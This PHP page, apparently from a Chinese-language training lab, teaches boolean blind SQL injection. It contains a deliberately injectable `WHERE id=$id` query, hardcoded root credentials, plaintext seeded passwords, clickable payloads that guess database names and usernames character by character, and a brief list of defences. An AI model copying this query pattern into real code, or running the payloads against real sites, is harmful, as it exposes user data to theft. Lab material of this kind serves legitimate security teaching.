<?php
// 布尔盲注场景
// 使用真实MySQL数据库

// 数据库连接信息
$servername = "127.0.0.1";
$username = "root";
$password = "123456";
$dbname = "zhao";

// 创建连接
$conn = new mysqli($servername, $username, $password, $dbname);

// 检查连接
if ($conn->connect_error) {
    die("连接失败: " . $conn->connect_error);
}

// 初始化数据库表和数据
function initDatabase($conn) {
    // 创建users表
    $create_users_sql = "CREATE TABLE IF NOT EXISTS users (
        id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
        username VARCHAR(30) NOT NULL,
        password VARCHAR(30) NOT NULL,
        email VARCHAR(50) NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )";
    $conn->query($create_users_sql);
    
    // 插入模拟数据
    $insert_users_sql = "INSERT IGNORE INTO users (username, password, email) VALUES
    ('admin', 'admin123', 'admin@example.com'),
    ('user1', 'password1', 'user1@example.com')";
    $conn->query($insert_users_sql);
}

// 数据库已在init_db.php中初始化

// 模拟数据库查询函数
function query($sql, $conn) {
    // 执行查询
    $result = $conn->query($sql);
    
    if (!$result) {
        // 捕获数据库错误
        throw new Exception($conn->error);
    }
    
    $rows = [];
    while ($row = $result->fetch_assoc()) {
        $rows[] = $row;
    }
    
    return $rows;
}

$id = $_GET['id'] ?? 1;
$results = [];
$error = '';

// 执行查询（存在SQL注入漏洞）
$sql = "SELECT * FROM users WHERE id=$id";
try {
    $results = query($sql, $conn);
} catch (Exception $e) {
    $error = $e->getMessage();
}

// 关闭连接
$conn->close();
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>布尔盲注 - SQL注入漏洞</title>
    <link rel="stylesheet" href="../assets/css/style.css">
    <style>
        body {
            background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1000px;
            margin: 30px auto;
        }
        .card {
            background: white;
            border-radius: 20px;
            padding: 35px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            margin-bottom: 25px;
        }
        .card h2 {
            color: #333;
            margin-bottom: 20px;
        }
        .alert-danger {
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
            color: white;
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 25px;
        }
        .info-section {
            background: #fff3cd;
            border-left: 5px solid #ffc107;
            padding: 20px;
            border-radius: 0 10px 10px 0;
            margin-bottom: 25px;
        }
        .query-box {
            background: #f8f9fa;
            padding: 25px;
            border-radius: 15px;
            margin: 20px 0;
        }
        .input-group {
            display: flex;
            gap: 10px;
            margin: 15px 0;
        }
        .input-group input {
            flex: 1;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
        }
        .btn {
            padding: 12px 25px;
            background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
        }
        .sql-code {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 20px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            margin: 15px 0;
            position: relative;
        }
        .sql-code::before {
            content: "执行的SQL:";
            display: block;
            color: #ffcc00;
            margin-bottom: 10px;
        }
        .results-box {
            margin: 15px 0;
            padding: 15px;
            border-radius: 8px;
        }
        .results-box.success {
            background: #d4edda;
            border: 2px solid #c3e6cb;
            color: #155724;
        }
        .results-box.failure {
            background: #f8d7da;
            border: 2px solid #f5c6cb;
            color: #721c24;
        }
        .payload-list {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 20px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            margin: 15px 0;
        }
        .payload-list h4 {
            color: #ffcc00;
            margin-bottom: 10px;
        }
        .payload-list code {
            color: #7ee787;
            cursor: pointer;
            display: block;
            padding: 5px 0;
        }
        .flag-box {
            background: #d4edda;
            border: 2px solid #28a745;
            color: #155724;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            margin: 20px 0;
            font-family: 'Courier New', monospace;
            display: none;
        }
        .flag-box.show {
            display: block;
        }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #667eea;
            text-decoration: none;
            font-weight: 600;
        }
        .error-box {
            background: #f8d7da;
            border: 2px solid #f5c6cb;
            color: #721c24;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
        }
        .blind-demo {
            background: #f0f0f0;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
        }
        .blind-demo h4 {
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="alert-danger">
                <h4>🚨 布尔盲注漏洞</h4>
                <p>本页面存在布尔盲注漏洞，通过构造条件语句，根据页面返回的布尔值判断数据库信息。</p>
            </div>
            
            <h2>3. 🔍 布尔盲注</h2>
            
            <div class="info-section">
                <strong>💡 漏洞说明：</strong><br>
                布尔盲注是一种通过页面返回的布尔值（True/False）来判断数据库信息的SQL注入技术。<br>
                当页面不显示错误信息，也不返回查询结果时，攻击者可以通过构造条件语句，根据页面的不同响应来推断数据库中的信息。<br>
                <br>
                <strong>特点：</strong>耗时较长，但适用范围广
            </div>
        </div>

        <div class="card">
            <h3>🔍 用户查询（存在漏洞）</h3>
            <div class="query-box">
                <form method="GET">
                    <div class="input-group">
                        <input type="text" name="id" placeholder="输入用户ID..." value="<?php echo htmlspecialchars($id); ?>">
                        <button type="submit" class="btn">查询</button>
                    </div>
                </form>
                
                <div class="sql-code">
                    <?php echo htmlspecialchars($sql); ?>
                </div>
                
                <?php if (!empty($error)): ?>
                <div class="error-box">
                    <strong>错误信息：</strong><?php echo htmlspecialchars($error); ?>
                </div>
                <?php endif; ?>
                
                <div class="results-box <?php echo !empty($results) ? 'success' : 'failure'; ?>">
                    <?php if (!empty($results)): ?>
                        <strong>✓ 查询成功：</strong>找到用户数据
                    <?php else: ?>
                        <strong>✗ 查询失败：</strong>未找到用户
                    <?php endif; ?>
                </div>
            </div>
        </div>

        <div class="card">
            <h3>🎯 布尔盲注Payload</h3>
            <div class="payload-list">
                <h4>1. 基础布尔测试</h4>
                <code onclick="setId('1 AND 1=1')">1 AND 1=1</code>
                <code onclick="setId('1 AND 1=2')">1 AND 1=2</code>
                
                <h4>2. 数据库信息探测</h4>
                <code onclick="setId('1 AND (SELECT COUNT(*) FROM information_schema.tables) > 0')">1 AND (SELECT COUNT(*) FROM information_schema.tables) > 0</code>
                
                <h4>3. 逐字符猜解</h4>
                <code onclick="setId('1 AND SUBSTRING((SELECT user()),1,1) = CHAR(97)')">1 AND SUBSTRING((SELECT user()),1,1) = CHAR(97)</code>
                <code onclick="setId('1 AND ASCII(SUBSTRING((SELECT database()),1,1)) > 100')">1 AND ASCII(SUBSTRING((SELECT database()),1,1)) > 100</code>
            </div>
            
            <div class="blind-demo">
                <h4>🔬 盲注原理演示</h4>
                <p><strong>步骤1：</strong>使用 <code>1 AND 1=1</code> 测试注入点（应返回成功）</p>
                <p><strong>步骤2：</strong>使用 <code>1 AND 1=2</code> 测试（应返回失败）</p>
                <p><strong>步骤3：</strong>使用 <code>1 AND (SELECT COUNT(*) FROM users) > 0</code> 判断表是否存在</p>
                <p><strong>步骤4：</strong>使用 <code>1 AND LENGTH((SELECT username FROM users LIMIT 1)) > 3</code> 猜解用户名长度</p>
                <p><strong>步骤5：</strong>使用 <code>1 AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1) = 'a'</code> 逐字符猜解</p>
            </div>
        </div>

        <div class="card">
            <h3>🛡️ 防御方法</h3>
            <div class="info-section">
                1. <strong>参数化查询：</strong>使用预处理语句和绑定参数<br>
                2. <strong>输入验证：</strong>对用户输入进行严格的类型检查和过滤<br>
                3. <strong>WAF：</strong>部署Web应用防火墙拦截可疑请求<br>
                4. <strong>速率限制：</strong>对同一IP的请求频率进行限制<br>
                5. <strong>最小权限：</strong>限制数据库用户权限
            </div>
            
            <a href="index.php" class="back-link">← 返回SQL注入模块首页</a>
        </div>
    </div>

    <script>
        function setId(payload) {
            document.querySelector('input[name="id"]').value = payload;
        }
    </script>
</body>
</html>
